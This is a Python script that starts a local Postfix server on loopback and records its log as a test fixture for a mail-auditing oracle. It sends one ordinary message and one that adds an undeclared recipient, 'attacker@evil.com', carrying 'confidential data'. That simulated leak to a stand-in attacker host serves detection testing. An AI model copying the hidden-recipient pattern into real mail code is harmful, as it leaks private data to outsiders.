#!/usr/bin/env python3
"""Capture a real MTA's log and verify the oracle reads it.

The plan's remaining item is "run on the fake-SMTP harness for CI
reproducibility **and** once against a real MTA, recording both". The CI half
exists. This is the other half: it starts Postfix, sends one honest message and
one carrying an undeclared BCC, then reads the MTA's own log to show the two
transactions differ.

WHY IT IS NOT A CI JOB
    It needs root, a package install, and a daemon. Putting that in CI would add
    minutes and a root-owned mail server to every pull request, and the thing it
    proves — "the parser reads Postfix's format" — is already pinned in
    `tests/test_mta_log.py` against a captured log. This script exists to
    REGENERATE that captured log, and to be run by hand when the claim is under
    review.

USAGE
    # On a Linux host with postfix installed, as root:
    sudo python3 scripts/capture_mta_log.py --out tests/data/postfix-maillog.txt

    # Without a local MTA, via Docker (what the README documents):
    scripts/capture_mta_log.sh

WHAT IT DOES NOT PROVE
    It does not make the MTA log a trust boundary. A process that can write the
    log can forge it; the claim is that observations come from the MTA's own
    accounting instead of from the code being observed.
"""

from __future__ import annotations

import argparse
import shutil
import socket
import subprocess
import sys
import time
from pathlib import Path

DEFAULT_LOG = "/var/log/mail.log"
HOST = "127.0.0.1"
PORT = 25

#: Postfix needs these set to accept mail for arbitrary domains on loopback.
#: `mydestination=` plus no local_recipient_maps means "accept and queue", which
#: is what a capturing MTA wants: the transaction is recorded even though
#: delivery will later be deferred for a domain it cannot resolve.
_POSTCONF = {
    "myhostname": "ecac-mta.test",
    "mydestination": "",
    "inet_interfaces": "127.0.0.1",
    "inet_protocols": "ipv4",
    "smtpd_reject_unlisted_recipient": "no",
    "local_recipient_maps": "",
    "maillog_file": DEFAULT_LOG,
    "compatibility_level": "3.6",
}


def _require_tools() -> None:
    for tool in ("postconf", "postfix"):
        if shutil.which(tool) is None:
            sys.exit(
                f"{tool} not found. Install postfix, or use scripts/capture_mta_log.sh "
                f"to run this inside a container."
            )


def _configure(postconf: str) -> None:
    for key, value in _POSTCONF.items():
        subprocess.run([postconf, "-e", f"{key}={value}"], check=True, capture_output=True)


def _start(postfix: str) -> None:
    # `postfix start` exits non-zero when already running; treat that as fine.
    subprocess.run([postfix, "start"], check=False, capture_output=True)
    deadline = time.monotonic() + 15
    while time.monotonic() < deadline:
        try:
            with socket.create_connection((HOST, PORT), timeout=1):
                return
        except OSError:
            time.sleep(0.25)
    sys.exit(f"the MTA did not start listening on {HOST}:{PORT} within 15s")


def _command(sock: socket.socket, verb: bytes) -> bytes:
    sock.sendall(verb + b"\r\n")
    return sock.recv(512)


def _send(recipients: list[str], subject: str, body: str) -> None:
    sock = socket.create_connection((HOST, PORT), timeout=5)
    try:
        _command(sock, b"EHLO capture")
        _command(sock, b"MAIL FROM:<tool@corp.com>")
        for recipient in recipients:
            _command(sock, f"RCPT TO:<{recipient}>".encode())
        _command(sock, b"DATA")
        sock.sendall(f"subject: {subject}\r\n\r\n{body}\r\n.\r\n".encode())
        sock.recv(512)
        _command(sock, b"QUIT")
    finally:
        sock.close()


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--out", required=True, type=Path, help="where to write the captured log")
    parser.add_argument("--log", default=DEFAULT_LOG, help="the MTA's log file")
    parser.add_argument(
        "--keep", action="store_true", help="leave the MTA running instead of stopping it"
    )
    args = parser.parse_args(argv)

    _require_tools()
    postconf = shutil.which("postconf") or "postconf"
    postfix = shutil.which("postfix") or "postfix"

    _configure(postconf)
    _start(postfix)

    # Two transactions whose difference is the whole point: the second accepts an
    # address the broker would never have declared. The client cannot mark it as
    # undeclared — the MTA does not know about declarations — so the log records
    # both addresses the same way, and the distinction has to come from the
    # ledger's declared set at verification time.
    _send(["internal@corp.com"], "ok", "ordinary message")
    _send(["internal@corp.com", "attacker@evil.com"], "leak", "confidential data")

    # qmgr and the per-recipient delivery lines are written asynchronously.
    time.sleep(2)

    source = Path(args.log)
    try:
        text = source.read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        sys.exit(f"cannot read {source}: {exc}")

    args.out.parent.mkdir(parents=True, exist_ok=True)
    args.out.write_text(text, encoding="utf-8")
    print(f"wrote {args.out} ({len(text.splitlines())} lines)")

    if not args.keep:
        subprocess.run([postfix, "stop"], check=False, capture_output=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
